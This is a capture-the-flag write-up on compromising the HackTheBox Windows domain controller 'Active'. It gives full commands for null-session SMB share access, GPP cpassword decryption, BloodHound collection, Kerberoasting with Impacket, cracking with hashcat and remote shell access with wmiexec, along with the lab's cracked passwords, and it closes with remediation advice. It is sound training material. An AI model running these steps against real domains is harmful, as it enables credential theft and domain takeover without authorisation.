# Hacking Active | HTB

In this walkthrough, we will focus on pwning **Active**, a machine on [HackTheBox](https://www.hackthebox.com/) that simulates a Windows domain controller. Our goal is to gain access to sensitive data by leveraging enumeration techniques and exploiting Windows-specific vulnerabilities. This box is ideal for demonstrating how SMB (Server Message Block) enumeration and Kerberoasting can be used to compromise a domain account and eventually gain domain administrator privileges.

The **Active** box simulates a real-world scenario of a corporate Windows network, giving us an opportunity to explore common attack vectors against Active Directory environments.

>[!NOTE]
>To gain an overview of Active Directory please see our [Active Directory Introduction](https://github.com/puzz00/active-directory-introduction) repo | to go deeper into enumerating and attacking AD environments please see our [AD Enumeration Basic Attacks](https://github.com/puzz00/ad-enumeration-basic-attacks) repo

---

## Overview

### Target Information:

- **Operating System**: Windows Server
- **Difficulty Level**: Easy to Medium
- **Services**: SMB, Kerberos (Domain Controller)

### Objective

By the end of this walkthrough, you will (possibly) understand:
1. How to enumerate SMB shares to identify accessible resources and potential attack surfaces.
2. The process of :fire: Kerberoasting :fire: which allows attackers to extract and crack service tickets for accounts with elevated privileges.
3. The importance of password hygiene and how weak passwords can lead to the compromise of high-privileged accounts in a Windows domain.

### Attack Strategy

1. **SMB Enumeration**: We'll start by identifying and enumerating available SMB shares on the machine. These shares often reveal sensitive information or can provide further attack vectors.
2. **Kerberoasting**: After enumeration, we'll focus on Kerberoasting, a technique used to extract service tickets for accounts registered with a Service Principal Name (SPN) in Active Directory. We'll attempt to crack these tickets to obtain a privileged user’s password.

>[!NOTE]
>We'll take a look at how to use :wolf: bloodhound :wolf: along the way, too

---

## Stage 1: Initial Enumeration with Nmap

Now that we have a clear understanding of our objectives, the first step is to perform reconnaissance on the **Active** box. We will use :sunglasses: **Nmap** :sunglasses: to identify open ports and running services. This will allow us to target specific services like SMB that may lead to further exploitation.

### 1. Full Port Scan

We start by running a full TCP port scan to identify all open ports on the machine. This is an essential first step, as it reveals which services are available for enumeration.

```bash
ports100=$(sudo nmap -n -Pn -p- --min-rate=250 -sS --open 10.10.10.100 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

- `-n`: No DNS resolution (speeds up the scan).
- `-Pn`: Skip host discovery (assuming the host is up).
- `-p-`: Scan all 65,535 TCP ports.
- `--min-rate=250`: Ensures a minimum rate of 250 packets per second, speeding up the scan.
- `-sS`: Stealth SYN scan.
- `--open`: Only show open ports.
  
The command uses `grep` to filter out the port numbers, then `cut` to isolate them from the output, and finally `tr` and `sed` to format them as a comma-separated list. This list of ports is stored in the variable `ports100`.

![1](/images/1.png)

### 2. Service Version Detection and Aggressive Scan

Next, we perform a version detection scan against the open ports identified in the previous step. This provides us with more detailed information about the services running on each port.

```bash
sudo nmap -Pn -n -p$ports100 -sV -A -oA ports100 10.10.10.100
```

- `-p$ports100`: Scan only the open ports found earlier.
- `-sV`: Version detection, which identifies the software and version running on the service.
- `-A`: Aggressive scan, enabling OS detection, version detection, script scanning, and traceroute.
- `-oA ports100`: Save the output in all formats (normal, XML, and grepable).

![2](/images/2.png)

### 3. Results and Domain Name Discovery

From this scan, we discover a critical piece of information: the domain name associated with this machine is **`active.htb`**. This domain name will be useful for further attacks, as many Windows-specific services (like SMB and Kerberos) are closely tied to domain infrastructure.

To ensure proper name resolution, we add the domain name to our `/etc/hosts` file:

```bash
sudo nano /etc/hosts
```

Then, add the following entry:

```
10.10.10.100 active.htb
```

This ensures that our tools can resolve **`active.htb`** to the correct IP address for future enumeration and exploitation :thumbsup: 

---

## Stage 2: SMB Enumeration and Credential Discovery

There are various paths we can take at this point - we will start by looking into smb shares as this can yield useful data...

### 1. Exploring the Replication Share

We begin by enumerating the SMB shares using **smbmap**, which allows us to check what shares are available and our access level. We are looking for a *null session* vulnerability in which we can access shares without needing valid creds.

```bash
sudo smbmap -H 10.10.10.100
```

This command lists all available shares on the target machine. From the output, we notice a share called **Replication** that we have read access to. This is worth looking into further :eyes: 

![3](/images/3.png)

### 2. Exploring the Replication Share

To dive deeper, we explore the contents of the **Replication** share:

```bash
sudo smbmap -H 10.10.10.100 -r
```

This command recursively lists the directories and files within the **Replication** share. We discover a directory named **active.htb**, which aligns with the domain name we previously uncovered.

Next, we list the contents of the **active.htb** directory:

```bash
sudo smbmap -H 10.10.10.100 -r 'Replication/active.htb'
```

Inside this directory, we observe more files and directories, but instead of examining each file one-by-one, we decide to download everything for offline inspection.

![4](/images/4.png)

![5](/images/5.png)

### 3. Downloading the Files

We connect to the **Replication** share using **smbclient** and proceed to download all files from the share:

```bash
sudo smbclient -N \\\\10.10.10.100\\Replication
```

- `-N`: Use a null session (no username or password required).

Once connected, we use the following commands to download the files:

```bash
RECURSE ON
PROMPT OFF
mget *
```

This grabs all the files within the **Replication** share, saving them locally for further inspection.

![6](/images/6.png)

### 4. Finding Credentials in Groups.xml

Among the downloaded files, we find a file named **Groups.xml**, which is particularly interesting. **Groups.xml** is related to **Group Policy Preferences (GPP)**, a feature that allows administrators to configure settings for user accounts. Unfortunately :roll_eyes: a well-known vulnerability in GPP can expose plaintext credentials for users, making it a valuable target for attackers :smiley:

We use the `cat` command to view the contents of the **Groups.xml** file:

```bash
cat Groups.xml
```

Inside, we find a sensitive entry: a `cpassword` value associated with the user **active.htb\SVC_TGS**. This indicates that the file contains an encrypted password for this domain user account :lock:

### 5. Exploiting Group Policy Preferences (GPP)

Group Policy Preferences (GPP) was introduced in Windows Server 2008 to allow administrators to easily manage various configurations. However, GPP included a feature to store credentials (e.g., for local administrator accounts) within Group Policy objects, which are distributed across the domain. These credentials were encrypted but - most unfortunate - the encryption key was published by Microsoft :grinning: allowing attackers to decrypt these stored passwords easily.

Since we found a `cpassword` in **Groups.xml**, we can use the **gpp-decrypt** tool to crack the encrypted password:

```bash
gpp-decrypt <cpassword_hash>
```

After running the tool, we successfully retrieve the plaintext password for the **SVC_TGS** user :unlock:

```
GPPstillStandingStrong2k18
```

![7](/images/7.png)

### Why This is Important

The reason we are interested in **Groups.xml** and the **cpassword** value is because of the well-documented vulnerability in GPP. Administrators who used Group Policy to manage accounts and passwords left them exposed to attackers who can simply decrypt the `cpassword` value. This vulnerability can grant an attacker valid credentials, allowing them to pivot within the network and potentially escalate privileges.

>[!NOTE]
>While the vulnerability related to **cpassword** values in **Group Policy Preferences (GPP)** was patched by Microsoft in 2014 (MS14-025), some organizations may still have legacy systems or misconfigurations that leave these files accessible and vulnerable | during penetration tests, it's still worth checking for **Groups.xml** files in older or poorly maintained environments, because if it's there, we wouldn't want to miss it and look a complete :horse: 

---

## Stage 3: Using BloodHound to Identify Privilege Escalation Paths

Now that we have valid credentials for the **SVC_TGS** user, our next step is to explore ways to escalate privileges within the domain. For this, we turn to :wolf: **BloodHound** :wolf: an awesome tool for Active Directory enumeration that helps us visualize and analyze potential attack paths within a Windows domain.

### 1. Why Use BloodHound?

BloodHound is specifically designed for Active Directory environments and is used to map out relationships between users, groups, and computers. It allows attackers (and defenders) to identify privilege escalation paths, vulnerable users, and misconfigurations. By using :wolf: we can determine how to move from a lower-privileged user, like **SVC_TGS**, to higher-privileged accounts, such as the **Administrator**.

We will focus on identifying **Kerberoastable** accounts, which can help us escalate privileges by targeting accounts that have Service Principal Names (SPNs) registered in Active Directory.

### 2. Running BloodHound

We start by launching the necessary services and :hammer_and_wrench: 

```bash
sudo neo4j console
```

![8](/images/8.png)

This starts the Neo4j database that BloodHound uses to store and visualize data. Once the database is running, we release the hound:

```bash
sudo bloodhound
```

![9](/images/9.png)

Next, we collect data from the **Active** domain using the python *ingestor*

>[!NOTE]
>A BloodHound ingestor is a tool that collects and gathers information from an Active Directory environment to feed into the BloodHound attack simulation platform | ingestors are responsible for gathering the necessary data | we use a python implementation since we are operating from a linux attack box

```bash
sudo bloodhound-python -d active.htb -u SVC_TGS -p 'GPPstillStandingStrong2k18' -ns 10.10.10.100 -c all
```

- `-d active.htb`: Specifies the domain to collect data from.
- `-u SVC_TGS`: The username we are authenticating with.
- `-p 'GPPstillStandingStrong2k18'`: The password for the **SVC_TGS** user.
- `-ns 10.10.10.100`: The IP address of the domain controller.
- `-c all`: Collects all available information for analysis.

This command gathers various pieces of data from the domain, including user privileges, group memberships, and potential attack vectors, and uploads the information to BloodHound for analysis :telescope:

![10](/images/10.png)

We click the *upload* button in Bloodhound and navigate to where all the juicy data is:

![11](/images/11.png)

### 3. Identifying Kerberoastable Accounts

After uploading the collected data into the BloodHound GUI, we can use the interface to explore potential attack paths. One of the most important features BloodHound offers is the ability to list **Kerberoastable accounts**. These are accounts that have SPNs and are therefore vulnerable to **Kerberoasting**.

We navigate to the **"List All Kerberoastable Accounts"** option in BloodHound, which reveals a key finding: the **Administrator** account is Kerberoastable :smiley: 

![12](/images/12.png)

### 4. Why We Are Interested in Kerberoastable Accounts

**Kerberoasting** is an attack that targets accounts with SPNs in an Active Directory environment. Kerberos, the authentication protocol used in Windows domains, relies on service tickets to authenticate users to services. When a user requests a service ticket for an SPN, *the ticket is encrypted with the account's password hash*.

Again!

When a user requests a service ticket for an SPN, *the ticket is encrypted with the account's password hash*.

If a :vampire: can capture the ticket, they can attempt to crack it offline, potentially revealing the account's plaintext password.

In this case, BloodHound shows that the **Administrator** account is vulnerable to Kerberoasting. This is significant because the **Administrator** is a member of both the **Enterprise Admins** and **Domain Admins** groups, meaning that compromising this account would grant us full control over the domain.

![13](/images/13.png)

Additionally, we observe that the **Administrator** account has an SPN of **active/CIFS:445**, making it a target for Kerberoasting.

![14](/images/14.png)

---

## Stage 4: Kerberoasting the Administrator Account

With :wolf: revealing that the **Administrator** account is Kerberoastable, we move forward by executing a **Kerberoasting** attack. The goal here is to extract the Kerberos service ticket for the **Administrator** account and then crack it to reveal the account's password.

### 1. Extracting the Service Ticket

We use **Impacket’s GetUserSPNs.py** script to request the service ticket for the **Administrator** account. This script allows us to pull Kerberos tickets for accounts with SPNs, which we can then attempt to crack offline. Any domain user can request these tickets, so the creds we obtained earlier will once again come in handy here:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request-user Administrator -outputfile active_kerb
```

- `-dc-ip 10.10.10.100`: Specifies the IP address of the domain controller.
- `active.htb/SVC_TGS`: Uses the **SVC_TGS** account (with valid credentials) to authenticate against the domain.
- `-request-user Administrator`: Requests the service ticket for the **Administrator** account.
- `-outputfile active_kerb`: Saves the extracted ticket to a file called **active_kerb**.

This command captures the **Administrator**'s Kerberos ticket, which we will now attempt to :hammer:

![15](/images/15.png)

>[!TIP]
>Saving the output to a file saves time when feeding the hash to other tools such as *hashcat*

### 2. Cracking the Kerberos Hash

Once we have the Kerberos ticket, we use **hashcat** to crack it. **Hashcat** is a great password-cracking tool that can perform offline brute-force attacks to recover the plaintext password from the ticket hash.

```bash
sudo hashcat -a 0 -m 13100 active_kerb ~/Documents/credentials/rockyou.txt -O
```

- `-a 0`: Uses a straight attack mode, which is dictionary-based.
- `-m 13100`: Specifies the hash type for Kerberos 5, etype 23 (RC4-HMAC).
- `active_kerb`: The file containing the Kerberos hash for the **Administrator** account.
- `~/Documents/credentials/rockyou.txt`: The password wordlist (in this case, the **rockyou.txt** wordlist).
- `-O`: Optimized kernel mode for speed.

After running **hashcat**, we successfully crack the password for the **Administrator** account:

```
Ticketmaster1968
```

What a great password :roll_eyes:

![16](/images/16.png)

![17](/images/17.png)

### 3. Verifying the Credentials

Now that we have the **Administrator**'s password, we verify that these credentials work by using **CrackMapExec**, a tool for assessing SMB and validating credentials in Active Directory environments.

```bash
sudo crackmapexec smb 10.10.10.100 -u Administrator -p 'Ticketmaster1968'
```

This command attempts to authenticate as **Administrator** on the domain controller. Upon execution, we see the following output:

```
(Pwn3d!)
```

This confirms that the credentials are valid and that we have successfully compromised the **Administrator** account, giving us full control over the domain :fireworks:

![18](/images/18.png)

---

## Section 5: Gaining a Remote Shell and Capturing the Flags

With valid **Administrator** credentials in hand, our final step is to gain a shell on the domain controller and retrieve the flags. For this, we will use **wmiexec.py**, a tool from the Impacket suite that allows us to execute commands on the remote system over WMI (Windows Management Instrumentation).

### 1. Gaining a Semi-Interactive Shell with wmiexec

To achieve a stealthier approach compared to tools like **psexec**, we use **wmiexec**. This method allows us to interact with the system without writing files to disk, making it a more covert way to execute commands on the target.

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/wmiexec.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100
```

- `active.htb/Administrator`: Specifies the domain and the **Administrator** account.
- `'Ticketmaster1968'`: The cracked password for the **Administrator** account.
- `10.10.10.100`: The IP address of the domain controller.

After running the command, we gain a semi-interactive shell on the domain controller. While not fully interactive, it allows us to execute system commands effectively.

![19](/images/19.png)

### 2. Navigating the System

With access to the system, we use basic commands to navigate through the file system. First, we change directories to the **Administrator**'s desktop:

```bash
cd C:\Users\Administrator\Desktop
```

We then list the contents of the directory:

```bash
dir
```

Among the files, we find the **root.txt** flag. To retrieve it, we simply display its contents:

```bash
type root.txt
```

![20](/images/20.png)

This gives us the final flag for the box, confirming that we have successfully compromised the domain controller :smiley: 

### 3. Retrieving the User Flag

Before finishing, we also navigate to the **SVC_TGS** user's desktop to retrieve the **user.txt** flag - it seems a shame to leave a job half-done!

```bash
cd C:\Users\SVC_TGS\Desktop
```

Again, we list the directory contents:

```bash
dir
```

Finally, we display the **user.txt** flag:

```bash
type user.txt
```

![21](/images/21.png)

With both flags captured, the **Active** machine has been fully pwned!

:skull:

---

## Section 6: Vulnerabilities Showcased and Remediation Steps

The **Active** machine highlights several key vulnerabilities that can exist in Windows Active Directory environments. Understanding these weaknesses is critical for both defenders and attackers, as it provides insight into how domain controllers can be compromised. Below are the vulnerabilities this machine showcases, along with simple remediation steps to mitigate them.

### 1. **SMB Share Misconfigurations**
   - **Vulnerability**: In this scenario, we were able to access SMB shares via a null session, which allowed us to enumerate files and retrieve sensitive information (e.g., the **Groups.xml** file containing credentials).
   - **Remediation**:
     - Disable anonymous access to SMB shares by properly configuring share permissions.
     - Regularly audit and review permissions on shared folders to ensure only authorized users have access.
     - Use stronger authentication mechanisms (e.g., SMB signing) and restrict access to specific IP addresses when possible.

### 2. **Group Policy Preferences (GPP) Vulnerability**
   - **Vulnerability**: The **Groups.xml** file stored credentials using **cpassword**, a legacy feature from Group Policy Preferences. Although this was patched by Microsoft (MS14-025), some environments still have lingering GPP configurations that store passwords insecurely.
   - **Remediation**:
     - Ensure that any Group Policy Preferences containing passwords are removed from the environment.
     - Use the **gpp-decrypt** tool or manual audits to identify any lingering **cpassword** values in Group Policy.
     - Switch to more secure credential management solutions, such as LAPS (Local Administrator Password Solution).

### 3. **Kerberoasting**
   - **Vulnerability**: By requesting the service ticket of the **Administrator** account, we were able to crack its hash offline through a Kerberoasting attack. This attack targets accounts with Service Principal Names (SPNs), exposing their password hashes.
   - **Remediation**:
     - Monitor for unusual Kerberos ticket requests, especially for sensitive accounts, using Active Directory event logging.
     - Rotate passwords regularly for service accounts and ensure they are long and complex.
     - Use Group Managed Service Accounts (gMSAs), which automatically manage account passwords and rotate them securely.
     - Limit the use of highly privileged accounts (like **Administrator**) to avoid exposing them unnecessarily via SPNs.

### 4. **Weak Passwords**
   - **Vulnerability**: The **Administrator** account used a weak, guessable password (**Ticketmaster1968**) that was cracked easily using a common wordlist.
   - **Remediation**:
     - Enforce strong password policies that require the use of complex, unique passwords.
     - Implement multi-factor authentication (MFA) for privileged accounts to reduce the risk of credential theft.
     - Use password auditing tools to detect weak passwords and encourage users to change them.

### 5. **Insufficient Privilege Management**
   - **Vulnerability**: The **Administrator** account had memberships in both **Domain Admins** and **Enterprise Admins**, giving it full control over the domain. This high level of privilege, combined with a weak password, allowed us to compromise the entire domain.
   - **Remediation**:
     - Follow the principle of least privilege, ensuring that only necessary accounts have administrative access.
     - Regularly review group memberships to ensure that accounts like **Domain Admins** and **Enterprise Admins** are only assigned to essential users.
     - Implement Just-in-Time (JIT) administration for privileged accounts, granting elevated access only when necessary and for limited durations.

---

## Final Thoughts

Through this walkthrough, we’ve demonstrated the process of compromising a domain controller on the **Active** machine from [HackTheBox](https://www.hackthebox.com/)

By combining enumeration, credential harvesting, Kerberoasting, and privilege escalation techniques, we were able to move from an initial foothold to full domain admin access, ultimately capturing both the **root.txt** and **user.txt** flags.

We hope you enjoyed this walkthrough and gained something of value from it :smiley:

Thanks to *eks* and *mrb3n* for creating the box, and thankyou to *you* for reading our repo on it :fist:
